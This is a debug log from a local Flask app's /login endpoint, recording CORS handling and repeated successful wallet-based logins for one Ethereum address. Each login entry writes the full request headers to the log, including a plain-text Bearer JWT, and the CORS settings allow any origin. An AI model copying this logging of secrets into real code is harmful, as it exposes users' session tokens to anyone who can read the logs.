2025-07-06 09:23:11,468 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:11,471 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:11,483 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:11,488 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 09:23:11,500 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:11,505 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:11,508 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:11,513 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 09:23:11,522 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:11,524 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:11,526 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:11,528 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 09:23:11,535 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:11,537 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:11,539 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:11,541 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 09:23:11,547 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:11,550 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:11,551 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:11,552 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 09:23:11,559 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:11,560 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:11,562 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:11,564 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 09:23:11,569 - api.auth - INFO - Received login request with method: POST
2025-07-06 09:23:11,572 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NjIyOTh9.33VS9lDlxhf5LKcnGCxa-JfbNiLc6b2kfJsYwuKe4Qk', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 09:23:11,574 - api.auth - INFO - Request content type: application/json
2025-07-06 09:23:11,575 - api.auth - INFO - Processing JSON request
2025-07-06 09:23:11,577 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:12,326 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:12,330 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:12,332 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:12,334 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:12,335 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:23:12,342 - api.auth - INFO - Received login request with method: POST
2025-07-06 09:23:12,355 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NjIyOTh9.33VS9lDlxhf5LKcnGCxa-JfbNiLc6b2kfJsYwuKe4Qk', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 09:23:12,386 - api.auth - INFO - Request content type: application/json
2025-07-06 09:23:12,393 - api.auth - INFO - Processing JSON request
2025-07-06 09:23:12,399 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:12,832 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:12,839 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:12,844 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:12,845 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:12,847 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:23:12,853 - api.auth - INFO - Received login request with method: POST
2025-07-06 09:23:12,856 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NjIyOTh9.33VS9lDlxhf5LKcnGCxa-JfbNiLc6b2kfJsYwuKe4Qk', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 09:23:12,861 - api.auth - INFO - Request content type: application/json
2025-07-06 09:23:12,866 - api.auth - INFO - Processing JSON request
2025-07-06 09:23:12,874 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:13,309 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:13,313 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:13,314 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:13,316 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:13,317 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:23:13,322 - api.auth - INFO - Received login request with method: POST
2025-07-06 09:23:13,325 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NjIyOTh9.33VS9lDlxhf5LKcnGCxa-JfbNiLc6b2kfJsYwuKe4Qk', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 09:23:13,328 - api.auth - INFO - Request content type: application/json
2025-07-06 09:23:13,330 - api.auth - INFO - Processing JSON request
2025-07-06 09:23:13,333 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:13,756 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:13,759 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:13,760 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:13,761 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:13,763 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:23:13,768 - api.auth - INFO - Received login request with method: POST
2025-07-06 09:23:13,769 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NjIyOTh9.33VS9lDlxhf5LKcnGCxa-JfbNiLc6b2kfJsYwuKe4Qk', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 09:23:13,771 - api.auth - INFO - Request content type: application/json
2025-07-06 09:23:13,772 - api.auth - INFO - Processing JSON request
2025-07-06 09:23:13,773 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:14,183 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:14,186 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:14,188 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:14,190 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:14,191 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:23:14,195 - api.auth - INFO - Received login request with method: POST
2025-07-06 09:23:14,197 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NjIyOTh9.33VS9lDlxhf5LKcnGCxa-JfbNiLc6b2kfJsYwuKe4Qk', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 09:23:14,198 - api.auth - INFO - Request content type: application/json
2025-07-06 09:23:14,199 - api.auth - INFO - Processing JSON request
2025-07-06 09:23:14,201 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:14,657 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:14,660 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:14,662 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:14,663 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:14,664 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:23:14,669 - api.auth - INFO - Received login request with method: POST
2025-07-06 09:23:14,670 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NjIyOTh9.33VS9lDlxhf5LKcnGCxa-JfbNiLc6b2kfJsYwuKe4Qk', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 09:23:14,672 - api.auth - INFO - Request content type: application/json
2025-07-06 09:23:14,673 - api.auth - INFO - Processing JSON request
2025-07-06 09:23:14,675 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:15,240 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:15,246 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 